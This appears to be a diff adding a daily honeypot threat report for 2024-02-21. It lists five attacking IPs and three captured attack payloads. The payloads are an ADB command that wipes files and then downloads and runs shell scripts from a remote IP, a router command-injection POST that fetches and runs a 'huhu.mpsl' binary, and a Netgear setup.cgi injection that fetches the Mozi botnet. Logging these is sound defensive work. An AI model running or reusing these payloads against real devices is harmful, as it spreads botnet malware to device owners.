@@ -1,0 +1,18 @@
+Top 5 IPs for 2024-02-21:
+
+1.14.31.235
+101.43.58.236
+129.151.44.205
+202.137.26.6
+150.109.204.117
+
+Malcious Commands seen:
+
+cd /data/local/tmp/;rm -rf *sh* ; rm -rf *arm* ; rm -rf *ppc* ; rm -rf *x86* ; rm -rf *mips* ;rm -rf *mpsl* ; rm -rf *spc* ; rm -rf *m68k* ; busybox wget http://103.174.73.85/adb1.sh; sh adb1.sh; wget http://103.174.73.85/adb1.sh; sh adb1.sh; curl http://103.174.73.85/adb1.sh; sh adb1.sh; busybox wget http://103.174.73.85/adb2.sh; sh adb2.sh; wget http://103.174.73.85/adb2.sh; sh adb2.sh; curl http://103.174.73.85/adb2.sh; sh adb2.sh; busybox wget http://103.174.73.85/adb3.sh; sh adb3.sh; wget http://103.174.73.85/adb3.sh; sh adb3.sh; curl http://103.174.73.85/adb3.sh; sh adb3.sh
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf *mpsl*;wget http://103.178.235.32/huhu.mpsl; chmod 777 huhu.mpsl; ./huhu.mpsl lblink.selfrep;rm -rf *mpsl*;
+
+GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0
